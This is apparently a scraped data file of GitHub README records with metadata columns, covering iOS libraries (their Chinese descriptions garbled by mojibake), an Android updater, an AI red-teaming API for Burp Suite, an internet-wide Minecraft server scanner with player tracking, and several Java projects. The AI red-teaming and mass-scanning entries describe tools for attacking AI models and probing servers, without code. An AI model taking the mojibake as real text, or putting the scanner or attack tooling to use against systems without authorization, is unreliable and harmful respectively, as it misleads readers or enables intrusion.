|179|[aiononhiii/LGFFreePT](https://github.com/aiononhiii/LGFFreePT)|ÂèØËá™Áî±Ê∑ªÂä†Âà∞ÊåáÂÆö‰ΩçÁΩÆÁöÑÂàÜÈ°µÊ†áÊéß‰ª∂(Âü∫‰∫é‰πãÂâçÁöÑ LGFPageTitleView ÁöÑ‰ª£Á†ÅËøõË°åÂÖ®Èù¢ÈáçÂÜôÂπ∂ÂºÄÊîæËÆ∏Â§öÊñ∞ÁöÑÂäüËÉΩ)|177|Objective-C|04/30|
|180|[Baymax0/BMChineseSort](https://github.com/Baymax0/BMChineseSort)|BMChineseSortÊòØ‰∏Ä‰∏™‰∏∫Ê®°Âûã„ÄÅÂ≠óÂÖ∏„ÄÅÂ≠óÁ¨¶‰∏≤Êï∞ÁªÑÊ†πÊçÆÁâπÂÆö‰∏≠ÊñáÂ±ûÊÄßÂü∫‰∫étableviewÂàÜÁªÑ‰ºòÂåñÁöÑÂ∑•ÂÖ∑Á±ªÔºåÂü∫‰∫éÂºÇÊ≠•„ÄÅÂ§öÁ∫øÁ®ãÈôç‰ΩéÊéíÂ∫èÊó∂Èó¥„ÄÇ|175|Objective-C|09/29|
|181|[QuintGao/GKCover](https://github.com/QuintGao/GKCover)|GKCover-‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ÈÅÆÁΩ©ËßÜÂõæÔºåËÆ©‰Ω†ÁöÑÂºπÁ™óÊõ¥easy|174|Objective-C|07/01|
|182|[blueeee/BLEProgressView](https://github.com/blueeee/BLEProgressView)|‰ΩøÁî®popÂÆûÁé∞Âä®ÁîªÁöÑËøõÂ∫¶Êù°|171|Objective-C|07/04|
|183|[chenyufeng1991/CollectionView](https://github.com/chenyufeng1991/CollectionView)|ËøôÈáåÊàëÂú®iOS‰∏≠‰ΩøÁî®‰∏âÁßç‰∏çÂêåÁöÑÊñπÂºèÂÆûÁé∞UICollectionViewÔºå‰πüÂ∞±ÊòØ‰∏ÄÁßçÁÄëÂ∏ÉÊµÅËßÜÂõæ„ÄÇÂàÜÂà´‰ΩøÁî®storyboard„ÄÅnibÂíåÁ∫Ø‰ª£Á†ÅÁöÑÊñπÂºèÊù•ÂÆûÁé∞„ÄÇ|169|Objective-C|03/11|
|184|[isnine/HutHelper](https://github.com/isnine/HutHelper)|ÊπñÂçóÂ∑•‰∏öÂ§ßÂ≠¶Ê†°Âõ≠Âä©ÊâãiOSÁ´Ø ÈõÜËØæÁ®ãË°®,ËÄÉËØïÊàêÁª©,ËÄÉËØïËÆ°Âàí,Ê†°Âõ≠ËØ¥ËØ¥,‰∫åÊâãÂ∏ÇÂú∫,ÁîµË¥πÊü•ËØ¢,Â§±Áâ©ÊãõÈ¢ÜÁ≠âÂäüËÉΩ‰∫é‰∏Ä‰Ωì|165|Objective-C|06/06|
|185|[yangKJ/KJBannerViewDemo](https://github.com/yangKJ/KJBannerViewDemo)|ËΩÆÊí≠ÂõæBanner - Êó†‰ªª‰ΩïÁ¨¨‰∏âÊñπ‰æùËµñ„ÄÅËΩªÈáèÁ∫ßÁªÑ‰ª∂  ÊîØÊåÅÁº©Êîæ„ÄÅËá™Â∏¶ÁºìÂ≠òÂä†ËΩΩ  ÊîØÊåÅËá™ÂÆö‰πâÁªßÊâø„ÄÅÂÆöÂà∂ÁâπÂÆöÊ†∑Âºè  ÊîØÊåÅÁΩëÁªúGIFÊí≠ÊîæÂíåÁΩëÁªúÂõæÁâáÂíåÊú¨Âú∞ÂõæÁâáÊ∑∑ÂêàÊòæÁ§∫ËΩÆÊí≠  ÊîØÊåÅÂú®StoryboardÂíåXib‰∏≠ÂàõÂª∫Âπ∂ÈÖçÁΩÆÂÖ∂Â±ûÊÄß|165|Objective-C|10/27|
|186|[miniLV/MNFloatBtn](https://github.com/miniLV/MNFloatBtn)|iOSÂÖ®Â±ÄÊÇ¨ÊµÆÊåâÈíÆÔºåÊòæÁ§∫ / ÂàáÊç¢ÂΩìÂâçAPIÁéØÂ¢É‰∏éÁâàÊú¨ ÔºåÊéåÊè°ÂíåÊµãËØïÊíïÈÄº‰∏ªÂä®ÊùÉ~|162|Objective-C|03/09|
|187|[shmxybfq/TFPopup](https://github.com/shmxybfq/TFPopup)|üöÄüöÄüöÄTFPopup‰∏çÁîü‰∫ßÂºπÊ°Ü,ÂÆÉÂè™ÊòØÂºπÊ°ÜÁöÑÂºπÂá∫Â∑•üöÄüöÄüöÄÈªòËÆ§ÊîØÊåÅÂ§öÁßçÂä®ÁîªÊñπÂºè‰∏ÄË°åË∞ÉÁî®,ÊîØÊåÅÂÆåÂÖ®Ëá™ÂÆö‰πâÂä®Áîª.|161|Objective-C|08/12|
|188|[coderlinxx/XXPageController](https://github.com/coderlinxx/XXPageController)|ÂàÜÈ°µÂä†ËΩΩÊéßÂà∂Âô®XXPageMenuController.Êèê‰æõ‰∫ÜÂ§öÁßç‰∏çÂêåÁöÑÂàÜÈ°µÂä®ÊÄÅÂ±ïÁ§∫ÊïàÊûú.|160|Objective-C|09/03|
|189|[leancloud/LeanStorageDemo-iOS](https://github.com/leancloud/LeanStorageDemo-iOS)|Âü∫‰∫é iOS SDKÔºåÂÖ®Èù¢Á§∫‰æã‰∫Ü LeanCloud ÁöÑÂ≠òÂÇ®ÂäüËÉΩÔºåÈôÑÂ∏¶‰∫Ü Swift ÁâàÊú¨|157|Objective-C|10/10|
|190|[MustangYM/WeChatSeptet-ForMac](https://github.com/MustangYM/WeChatSeptet-ForMac)|ÁÆÄÁâàMacÂæÆ‰ø°Â∞èÂä©Êâã|155|Objective-C|09/18|
|191|[opooc/iOSClientOfQFNU](https://github.com/opooc/iOSClientOfQFNU)|iOSÊéå‰∏äÊõ≤Âõ≠|155|Objective-C|09/05|
|192|[EchoZuo/ECPrivacyCheckTools](https://github.com/EchoZuo/ECPrivacyCheckTools)|iOS Á≥ªÁªüÈöêÁßÅÊùÉÈôêÊ£ÄÊµãÂ∑•ÂÖ∑„ÄÇiOS system privacy permission check tools.|155|Objective-C|06/08|
|193|[ripperhe/ZYTagView](https://github.com/ripperhe/ZYTagView)|‰ªøÂæÆÂçöÂõæÁâáÊ∑ªÂä†Ê†áÁ≠æ|151|Objective-C|02/10|
|194|[Zirkfied/ZFScan](https://github.com/Zirkfied/ZFScan)|A simple scan QRCode / BarCode library for iOS - ‰∫åÁª¥Á†Å/Êù°ÂΩ¢Á†Å Êâ´ÊèèÂíåÁîüÊàê|151|Objective-C|07/15|
|195|[jinht/DocViewer](https://github.com/jinht/DocViewer)|ÊñáÊ°£/Êñá‰ª∂Êü•ÁúãÂô®ÔºàÊîØÊåÅÊú¨Âú∞ÊàñËÄÖÂÖ∂‰ªñappÂàÜ‰∫´ËøáÊù•ÁöÑword„ÄÅexcel„ÄÅpdf„ÄÅrtfÁ≠âÊ†ºÂºèÊñá‰ª∂Ôºâ|150|Objective-C|05/12|
|196|[wcsBurneyCoder/readNovel](https://github.com/wcsBurneyCoder/readNovel)|‰∏ÄÊ¨æÂ∞èËØ¥ÈòÖËØªÂô®ÁöÑÂÆåÊï¥Â∫îÁî®|150|Objective-C|08/26|
|197|[micyo202/YZAuthID](https://github.com/micyo202/YZAuthID)|iOS TouchIDÔºàÊåáÁ∫πÔºâ/ FaceIDÔºàÈù¢ÂÆπÔºâÈ™åËØÅÁ±ªÂ∫ìÔºå‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÈ´òÊïà|149|Objective-C|07/02|
|198|[ChinaArJun/loveFreshPeakApp_oc](https://github.com/ChinaArJun/loveFreshPeakApp_oc)|IOSÁîµÂïÜË¥≠Áâ©APP:  Áà±È≤úËúÇOCÁâàÔºåËßÑËåÉÁöÑ‰ª£Á†ÅÈ£éÊ†ºÔºå‰ΩøÁî®MasonryÂ∏ÉÂ±ÄÈÄÇÈÖçÊâÄÊúâiosÊú∫Âûã                                Shopping e-commerce projects, using automatic layout, suitable for any Ios model Website Ôºõ |149|Objective-C|05/05|
|199|[Suzhibin/ZBNetworking](https://github.com/Suzhibin/ZBNetworking)| AFNetworking4.XÂ∞ÅË£Ö  GET/POST /PUT/PATCH /DELETE / Upload /DownLoad ÁΩëÁªúËØ∑Ê±Ç Ê∑ªÂä†‰∫ÜËØ∑Ê±ÇÁºìÂ≠ò,Á¶ªÁ∫ø‰∏ãËΩΩ,ÊòæÁ§∫ÁºìÂ≠òÂ§ßÂ∞è,Âà†Èô§ÁºìÂ≠ò,ÂèñÊ∂àÂΩìÂâçËØ∑Ê±ÇÁ≠âÂäüËÉΩ|148|Objective-C|10/15|
|200|[An-iOSer/ZZTools](https://github.com/An-iOSer/ZZTools)|ÂåÖÊã¨: StarViewÊòüÊòüËØÑ‰ª∑(ÊîØÊåÅÂçäÊòü, Êï¥Êòü, ‰ªªÊÑèÊòü, ÊîØÊåÅÊãñÂä®, ÊîØÊåÅËá™ÂÆö‰πâÊòüÊòüÂõæÁâá, Êï∞Èáè, Â§ßÂ∞è, Èó¥Ë∑ù, ÊúÄ‰ΩéÂàÜÂÄº). ÁÄëÂ∏ÉÊµÅ(ÂûÇÁõ¥, ÊµÆÂä®, Ê∑∑ÂêàÊ®°ÂºèÁÄëÂ∏ÉÊµÅ)Á≠â.|146|Objective-C|03/20|

‚¨Ü [ÂõûÂà∞ÁõÆÂΩï](#ÁõÆÂΩï)",0,0,1,GPL-3.0,0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
mamiiblt/instafel-updater,main,"# Instafel Updater

Instafel Updater is an automated update tool based on **Shizuku**. This tool allows you to automatically download and install updates without the need for manual intervention. By leveraging Shizuku, updates are installed seamlessly in the background, ensuring your Instafel is always up-to-date with minimal effort.

## How It Works

Instafel Updater uses **WorkManager** to perform periodic checks for updates. This ensures that the app stays up-to-date without requiring manual checks from the user. In addition, a **Foreground Service** is utilized to prevent the process from being terminated by the Android system during the update process. Once an update is detected, the update package is downloaded and installed automatically using the **pm** (Package Manager) command. By combining these technologies, the Instafel Updater provides a fully automated update service for Instafel, making the update process completely hands-free.

## Installation

To install Instafel Updater, you can download the latest builds from the [Releases](https://github.com/mamiiblt/instafel-updater/releases) section of this repository.
## Libraries

A special thank you to the creators of the following libraries, whose contributions made this project possible:

- [Shizuku](https://shizuku.rikka.app/): A powerful tool for accessing Android system services.
- [WorkManager](https://developer.android.com/reference/androidx/work/WorkManager): A library for managing background tasks in a reliable way.
- [OkHttp](https://square.github.io/okhttp/): A high-performance HTTP client used for checking updates.
- [Material-You-Preferences](https://github.com/TTTT55/Material-You-Preferences): A library for creating modern, Material You-style preference screens.

## Contributions

If you'd like to contribute to this project, feel free to submit a pull request or open an issue if you encounter any bugs. Contributions are always welcome!

Developed with ‚ù§Ô∏è by mamiiblt
",6,1,1,Apache-2.0,1,6.0,0.0,1.0,1.0,10.0,0.0,-2.15,2.0
microsoft/PyRIT-Ship,main,"# Introduction 
This repository contains our prototype to enable the open source [PyRIT](https://github.com/Azure/PyRIT) toolkit to be used as an API for integrating into other tooling. We welcome suggestions and feedback, and we intend to keep this repository updated. However, at this point this is a prototype and passion project for our team and have no roadmap or funding to maintain this as an actual product.

The repository currently contains:
- /pyritship : A Python Flax Server with some basic features of PyRIT exposed over API (prompt generator and scoring)
- /burp_extension : A Java extension for BURP Suite to use PyRIT from the **Intruder** module

![Cartoon image of pirate raccoons on a pirate ship](./docs/images/pyrit_ship.png)

# Blue Hat 2024 Talk
We gave [a talk at Blue Hat 2024 about PyRIT Ship](https://www.youtube.com/watch?v=wna5aIVfucI), talking about the Microsoft AI Red Team and why we made PyRIT Ship and what our hopes and dreams are. If you want to skip straight to the demo, [you can use this link](https://youtu.be/wna5aIVfucI?t=1061).

# Getting Started - Setup & Build code
[PyRIT Ship Setup & Documentation](/docs/pyritship.md) \
[BURP Suite Extension Setup & Documentation](/docs/burp_extension.md)

# Demo running BURP Suite extension
[Attack Gandalf with PyRIT Ship](/docs/burp_gandalf_demo.md)

# TODO
We have code close to ready to support:
- Running PyRIT Ship in a Docker container so no local Python setup is required
- Using Entra ID auth for Azure OpenAI (PyRIT supports this, but PyRIT Ship only uses API key at the moment)
- Using other endpoints besides Azure OpenAI (PyRIT supports this, we just need to add this to PyRIT Ship)
- Prompt generation conversation history

Work-in-progress:
- Browser extension (Chrome/Edge)
- Supporting converters in BURP Suite

Wishlist:
- More PyRIT features in the API
- [Playwright](https://playwright.dev/) integration to support test automation using PyRIT Ship / PyRIT


## Contributing

This project welcomes contributions and suggestions.  Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft 
trademarks or logos is subject to and must follow 
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.",0,0,1,MIT,0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Funtimes909/ServerSeekerV2,main,"[![Gradle](https://img.shields.io/badge/Gradle-02303A.svg?style=for-the-badge&logo=gradle&logoColor=white)](https://gradle.org/)
[![PostgreSQL](https://img.shields.io/badge/PostgreSQL-%234169E1?style=for-the-badge&logo=postgresql&logoColor=white)](https://www.postgresql.org/)
[![JDA](https://img.shields.io/badge/JDA-%235865F2?style=for-the-badge&logo=discord&logoColor=white)](https://jda.wiki/)
[![Java](https://img.shields.io/badge/java-21-%23ED8B00.svg?style=for-the-badge&logo=openjdk&logoColor=white)](https://adoptium.net/)

# ServerSeekerV2

ServerSeekerV2 is a better version of the original ServerSeeker. After being sold to a third party that did a huge blunder and got the entire project killed, I decided to take a crack and make my own Minecraft scanner.

Currently, the only IP address used by me to scan for servers is ``45.135.194.65`` if you are seeing join requests in your server from the same username but a different IP address, it is not me.

If you wish to request a server be removed from the public database and prevented from being scanned again, join my [Discord Server](https://discord.gg/wYTe2ZwD7g) or [Matrix Space](https://matrix.to/#/#projects:funtimes909.xyz) and message ``@funtimes909`` directly.

Unlike the original ServerSeeker, V2 has some extra features:
- Basic whitelist checking
- Player Tracking
- Open Source
- Self Hostable (Host your own scanner and database!)

## Goals
Some longer term goals I would like to add:
- Bedrock support.
- Use of a Minecraft account pool for a faster and more accurate whitelist/cracked server detection.
- Subproject to automatically log in to unwhitelisted servers with accounts from the account pool and send a friendly message in chat warning of being unprotected

## FAQ
- Q: How can I get my server removed?
- A: Join my [Matrix Space](https://matrix.to/#/#projects:funtimes909.xyz) or [Discord Server](https://discord.gg/wYTe2ZwD7g) and ping me or someone with moderator privileges asking for it to be removed


- Q: How can I protect my server?
- A: Enable a whitelist for your server, a whitelist allows only specified players to join your server, run ``/whitelist on`` and then ``/whitelist add <player>`` for every player that will join your server. Additionally, setting ""online-mode"" to true in the ``server.properties`` file helps a lot


- Q: Why?
- A: As mentioned above, the previous owner of the original ServerSeeker, sold it to a third party, that got the discord bot and discord server terminated within a month of the sale. At the time I was looking for a project to sink my endless amounts of free time into, so shortly after the sale, I started developing this :)

## Related projects
- [Discord Bot](https://git.funtimes909.xyz/Funtimes909/ServerSeekerV2-Discord-Bot)
- [PyAPI](https://git.funtimes909.xyz/Funtimes909/ServerSeekerV2-PyAPI)

## Storing data in the database
To store information in a database you will need to set up PostgreSQL:  

### Installation
#### Ubuntu
```sh
sudo apt-get install postgresql
```
#### Arch
```sh
sudo pacman -S postgresql
```


### Configuration
```sh
sudo -u postgres psql
```
After that you should get a terminal like this  
```
postgres=#
```  
Run the commands below to create a new user:  
```sql
ALTER USER postgres with encrypted password 'your_password';
```
Then put the new password in the `config.json` file.

## Special thanks
- [EngurRuzgar](https://github.com/EngurRuzgar): Documentation and providing me with valid testing servers and for maintaining the [Python API](https://github.com/Funtimes909/ServerSeekerV2-PyAPI)
- [coolGi](https://coolgi.dev/): Code cleanup and general tips
",0,0,2,GPL-3.0,0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
langchain4j/langchain4j-community,main,"# LangChain4j Community

## Introduction

Welcome!

LangChain4j Community maintains integrations including model provider, embedding store, etc.

## Get Help
Please use [Discord](https://discord.gg/JzTFvyjG6R) or [StackOverFlow](https://stackoverflow.com/search?q=langchain4j-community) to get help.


## Request Features
Please let us know what features you need by [opening an issue](https://github.com/langchain4j/langchain4j-community/issues/new/choose).


## Contribute
Contribution guidelines can be found [here](https://github.com/langchain4j/langchain4j-community/blob/main/CONTRIBUTING.md).
",3,11,3,Apache-2.0,4,34.0,1.0,5.0,1.0,15.0,0.0,-5.300000000000001,179.0
singlr-ai/nocaptcha,main,"# NoCAPTCHA

Replace CAPTCHA with single-use, disposable passkeys. Human-friendly bot prevention without the frustration.

To get a feel for the widget, checkout the [hosted demo](https://demo.singlr.ai/nocaptcha/)

![NoCaptcha](./nocaptcha.png)

## Programming languages and frameworks
The API is build in Java using Helidon 4.x. Powered by Java virtual threads. The UI is pure Javascript using Vite build tool.

## Build and run
Start the server With JDK21+
```bash
mvn package
cd api
java -jar target/api.jar
```

### Debugging

For adding a debugger
```bash
java -agentlib:jdwp=transport=dt_socket,address=127.0.0.1:5005,suspend=n,server=y -jar target/api.jar
```

## Coding & naming conventions
We use the check style plugin and have adopted Google's check style [rules](https://github.com/checkstyle/checkstyle/blob/master/src/main/resources/google_checks.xml)

Configure your IDE accordingly. To ensure that you have followed the conventions, run:
```bash
mvn validate
```

## Contributing

Contributions are welcome! Feel free to help enhance either the:
- Backend passkeys-based NoCaptcha implementation
- Frontend NoCaptcha widget
- Address the TODOs in the code

Just fork the repository and submit a pull request with your improvements.",0,1,1,MIT,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,13.0
eazybytes/event-driven-microservices,3.3.4,"# Event Driven Microservices with CQRS, Saga, Event Sourcing

[![Image](https://github.com/eazybytes/event-driven-microservices/blob/3.3.4/edm.png ""Event Driven Microservices with CQRS, Saga, Event Sourcing"")](https://www.udemy.com/course/event-driven-microservices-with-cqrs-saga-event-sourcing/?referralCode=C1C67F2C2F541C8F2B96)

Learn how to develop Event Driven Microservices using Spring Boot, Axon framework, CQRS, Saga, Event Sourcing patterns

## Topics covered in the course
* Section 1 - Database-per-service pattern
* Section 2- Understanding CQRS and Event Sourcing patterns- Theory
* Section 3 - Implementing CQRS and Event Sourcing patterns
* Section 4 - Materialized View Pattern
* Section 5 - Choreography Saga pattern
* Section 6 - Orchestration Saga pattern
* Section 7 - Snapshots in Event sourcing pattern
* Section 8 - Thank You & Congratulations

## Pre-requisite for the course
- Good understanding on Java and Spring concepts
- Good knowledge on Spring Boot, Microservices

## Important Links
- AxonIQ website - https://www.axoniq.io/
- AxonIQ Docs - https://docs.axoniq.io/home/
- RabbitMQ website - https://www.rabbitmq.com
",0,0,1,Apache-2.0,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
Ayush7-BIT/turbo-robot,main,"# Contributing to turbo-robot

Welcome to the turbo-robot! We‚Äôre glad you‚Äôre here to contribute to a growing collection of essential coding algorithms and famous code solutions. Whether you‚Äôre here for Hacktoberfest or to enhance this repository, we appreciate your efforts!

Getting Started

How to Contribute:

	1.	Fork the repository: Click the ‚ÄòFork‚Äô button at the top-right corner of this page to create a copy of this repository on your GitHub account.

	2.	Clone the repository: Use the command below to clone the forked repository to your local machine:

        git clone https://github.com/your-username/repository-name.git

    3.  Create a new branch: It‚Äôs recommended to work in a new branch for each contribution.

        git checkout -b feature-branch

    4.  Make your changes: Add new algorithms or enhance the existing ones. Be sure to write clean and well-documented code.

	5.	Commit your changes: Write meaningful commit messages that describe your changes clearly.

        git commit -m ""Added [algorithm name] or Improved [functionality]""

    6.  Push your branch: Push your branch to your forked GitHub repository.
    
        git push origin feature-branch

    7.	Create a Pull Request: Navigate to this repository on GitHub, click ‚ÄúNew Pull Request,‚Äù and follow the prompts.

    What We Expect:

	‚Ä¢	Clarity: Make sure your code is well-documented with comments and follows consistent formatting.
	‚Ä¢	Efficiency: Algorithms should be optimized for performance, with explanations if needed.
	‚Ä¢	Readability: Ensure your code is easy to understand for other contributors or learners.
	‚Ä¢	Tested Code: Please test your contributions before submitting a Pull Request (PR).

Contribution Guidelines

	‚Ä¢	Ensure that your code or improvements are not already present in the repository. Check existing contributions before adding your own.
	‚Ä¢	Each algorithm should have a brief description of its purpose, time complexity, and use cases in the code comments or as a markdown file (if necessary).
	‚Ä¢	No plagiarized content. Always provide credit if you use or adapt existing solutions.
	‚Ä¢	Contributions should focus on common algorithms (e.g., sorting, searching, dynamic programming) or well-known problems (e.g., Fibonacci series, factorial) that can help others prepare for interviews or coding challenges.

Hacktoberfest Participation

This repository is part of Hacktoberfest 2024 üéâ! Feel free to contribute as part of your Hacktoberfest journey by:

	‚Ä¢	Adding new algorithms or improving existing ones.
	‚Ä¢	Fixing bugs or optimizing the current code.
	‚Ä¢	Enhancing documentation or examples.

Note: Make sure your contributions follow the Hacktoberfest guidelines to be counted towards your total. Contributions will only be accepted if they meet the quality standards set by the Hacktoberfest rules.


Need Help?

If you have any questions, feel free to create an issue on GitHub, and we‚Äôll be happy to assist you.

Happy coding! üöÄ

This will guide contributors in understanding your repository‚Äôs requirements and encourage them to participate in Hacktoberfest. Let me know if you‚Äôd like any adjustments!
",0,122,1,,1,502.0,0.0,1.0,1.0,5.0,0.0,-0.9,1.0
a8anassis/CF7-Testbed,main,"# CF7-Testbed
This is the main Java repo for Coding Factory 7 AUEB
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
RoastSlav/quickdrop,master,"[![Build Status](https://jenkins.tyron.rocks/buildStatus/icon?job=quickdrop)](https://jenkins.tyron.rocks/job/quickdrop)
[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker Pulls](https://img.shields.io/docker/pulls/roastslav/quickdrop?logo=docker&style=flat)](https://hub.docker.com/r/roastslav/quickdrop)


# QuickDrop

QuickDrop is an easy-to-use file sharing application that allows users to upload files without an account,
generate download links, and manage file availability, file encryption and optional password
protection.

This project is made with the self-hosting community in mind as a self-hosted file-sharing application.

# Features

## File Upload
- Users can upload files without needing to create an account.  
- Supports **Chunked Uploads** for reliable file transfers.

## File Management
- Manage file availability with options to keep files indefinitely or delete them.
- Add hidden files that are only accessible via their unique link.
- Password-protected files can be updated (e.g., ""kept indefinitely"").

## Whole App Password Protection
- Protect the entire app with a password to restrict access.

## Shareable Links
- **Two types of share links** managed through a single, streamlined modal:
  - **Normal Links**: Require passwords if the file or app is password-protected.
  - **Token-Based (Unrestricted) Links**: Single-use links with customizable expiration days. These bypass password requirements but provide controlled access.
  - **QR Code Generation**: Generates QR codes for easy sharing.

## Password Protection
- Files can be protected with a password for added security.
- Password-protected files are encrypted to ensure privacy and secure storage.

## Admin Panel
- Centralized management for files and settings.
- Adjustable file size limits and file lifetime configurations in the admin panel.
- Logs and activity tracking for enhanced oversight.
- Disable ‚ÄúView Files‚Äù : Turn off the built-in file listing page for enhanced privacy (removes the ""hidden"" files option as it removes the need for it).

---

## Technologies Used

- **Java**
- **SQLite**
- **Spring Framework**
- **Spring Security**
- **Spring Data JPA (Hibernate)**
- **Spring Web**
- **Spring Boot**
- **Thymeleaf**
- **Bootstrap**
- **Maven**

## Getting Started

### Installation

**Installation with Docker**

1. Pull the Docker image:

```
docker pull roastslav/quickdrop:latest
```

2. Run the Docker container:

```
docker run -d -p 8080:8080 roastslav/quickdrop:latest
```

Optional: Use volumes to persist the uploaded files when you update the container:

```
docker run -d -p 8080:8080 \
  -v /path/to/db:/app/db \
  -v /path/to/log:/app/log \
  -v /path/to/files:/app/files \
  quickdrop
```

**Installation without Docker**

Prerequisites

- Java 21 or higher
- Maven
- SQLite

1. Clone the repository:

```
git clone https://github.com/RoastSlav/quickdrop.git
cd quickdrop
```

2. Build the application:

```
mvn clean package
```

3. Run the application:

```
java -jar target/quickdrop-0.0.1-SNAPSHOT.jar
```

## Updates

To update the app, you need to:

1. Stop and remove the old container.
2. Pull the new image.
3. Start the updated container.

If you want to ensure file and database persistence between updates, you can use Docker volumes. (Check docker instalation above)

## License

This project is licensed under the MIT License. See the `LICENSE` file for details.
",3,7,2,MIT,0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
sionpardosi/Student-Learning-Hub-Aplikasi-Sederhana-Latihan-Belajar-Mahasiswa-Berbasis-JAVA,main,"# Student Learning Hub - App Latihan Belajar Sederhana dengan Tekn. JAVA

### <summary><strong>Tools:</strong></summary>
<p>
    <img src=""https://img.shields.io/badge/Code-Java-blue?&logo=java"" />
    <img src=""https://img.shields.io/badge/Database-JDK-orange?&logo=oracle"" />
    <img src=""https://img.shields.io/badge/Editor-Eclipse-2C2255?&logo=eclipseide"" />
    <img src=""https://img.shields.io/badge/Editor-NetBeans-0071C5?&logo=apache&logoColor=white"" />
    <img src=""https://img.shields.io/badge/Editor-IntelliJ%20IDEA-brightgreen?&logo=intellijidea"" />
</p>

**Student Learning Hub** is a simple Java-based application designed to assist students in their learning exercises and exam management. This application provides access for both lecturers and students to interact through quizzes and online grade management features.

## Overview

*Student Learning Hub* is an innovative application aimed at enhancing the learning experience for students. The application facilitates improved interaction between lecturers and students through various user-friendly features.

## Key Features

- **User Authentication**: 
  - Both lecturers and students can securely register and log into the system.

- **Exam Question Management**: 
  - Lecturers can add, edit, and delete exam questions, allowing students to complete these assignments effectively.

- **Interactive Quizzes**: 
  - Students can take quizzes to test their knowledge and receive immediate feedback on their scores. They can also view the answer keys after completing the quizzes.

- **Grade Reports**: 
  - Students can access their scores from completed quizzes, providing valuable feedback for their learning process.

- **Comment Feature**: 
  - Students can leave comments related to questions and practice results, facilitating constructive two-way communication.

## Purpose

The application aims to assist students in honing their academic skills while providing necessary support for lecturers in the teaching process. With an intuitive interface and easy access, *Student Learning Hub* serves as an effective tool for improving educational quality.

## Table of Contents

- [Introduction](#introduction)
- [Objectives](#objectives)
- [Scope](#scope)
- [Features](#features)
- [Installation](#installation)
- [Requirements](#requirements)
- [Usage](#usage)
- [Project Structure](#project-structure)
- [License](#license)

## Introduction

This document outlines the system requirements for developers and describes how the application works and its usage rules. The application is built for students with the goal of providing access to information and evaluation tools.

## Objectives

The objective of this application is to facilitate lecturers in administering tests and managing exam questions, as well as to assist students in enhancing their skills through the provided exercises.

## Scope

This application encompasses features for both lecturers and students, where lecturers can provide exam questions, and students can take tests. Lecturers can also view student results after examinations.

## Features

### For Lecturers

- Registration and login.
- Question management: add, edit, and delete exam questions.
- View student data and exam results.
- Access comments and feedback from students.

### For Students

- Registration and login.
- Access information related to the application and announcements.
- Complete quizzes and tests assigned by lecturers.
- View results and answer keys after tests.

## Installation

1. Clone this repository:
   ```bash
   git clone https://github.com/username/Student-Learning-Hub.git
",0,0,1,,0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0
anshumansinha3301/Stock-Trading-Simulation,main,"Software Requirements Specification (SRS) for Stock Trading Simulation System


Table of Contents:
1. Introduction
   - 1.1 Purpose
   - 1.2 Scope
   - 1.3 Definitions, Acronyms, and Abbreviations
   - 1.4 References
   - 1.5 Overview
2. Overall Description
   - 2.1 Product Perspective
   - 2.2 Product Features
   - 2.3 User Classes and Characteristics
   - 2.4 Operating Environment
   - 2.5 Design and Implementation Constraints
   - 2.6 Assumptions and Dependencies
3. System Features
   - 3.1 User Registration and Authentication
   - 3.2 Portfolio Management
   - 3.3 Stock Trading (Buy/Sell, Short Selling, Margin Trading)
   - 3.4 Limit Orders and Order Matching Engine
   - 3.5 Market Simulation and Real-Time Updates
   - 3.6 Market News and Analytics
   - 3.7 Technical Indicators (SMA, EMA)
   - 3.8 Transaction History and Funds Management
4. Non-functional Requirements
   - 4.1 Performance Requirements
   - 4.2 Security Requirements
   - 4.3 Usability Requirements
   - 4.4 Reliability Requirements
   - 4.5 Maintainability
5. External Interface Requirements
6. Other Requirements
7. Appendices

1. Introduction
1.1 Purpose
The purpose of this document is to define the functional and non-functional requirements for the development of a **Stock Trading Simulation System**. The system emulates stock market behavior, enabling users to perform various trading activities (buy/sell, margin trading, short selling), analyze stocks, and manage their portfolios. It provides an educational platform for understanding market operations and trading strategies in a risk-free environment.

1.2 Scope
This project simulates a trading platform with real-time market updates and technical indicators. Users can trade stocks using different methods, manage portfolios, view transaction history, and perform market analysis through analytics and technical indicators. The project includes a market simulation, a priority-queue-based order matching engine, and margin and short selling functionalities.

1.3 Definitions, Acronyms, and Abbreviations
- SMA: Simple Moving Average
- EMA: Exponential Moving Average
- UI: User Interface
- API: Application Programming Interface

1.4 References
- Java SE Documentation
- Data Structures and Algorithms references for priority queues

1.5 Overview
This document provides a detailed description of the system's functionality, user interface, technical requirements, and the environment in which it will operate.

2. Overall Description

2.1 Product Perspective
The system is designed as a terminal-based application where users can simulate real-time stock trading operations. It interacts with users through text-based commands, allowing them to execute trades, manage funds, analyze stocks, and track their portfolios.

2.2 Product Features
Key features include:
- User Authentication: Secure user registration and login with password protection.
- Portfolio Management: Users can manage stock portfolios and monitor total value.
- Stock Trading: Execute buy/sell orders, short selling, and margin trading.
- Order Matching: Match buy and sell orders with priority queues.
- Market Simulation: Stock prices fluctuate in real-time during the session.
- Technical Indicators: View SMA and EMA for stock analysis.
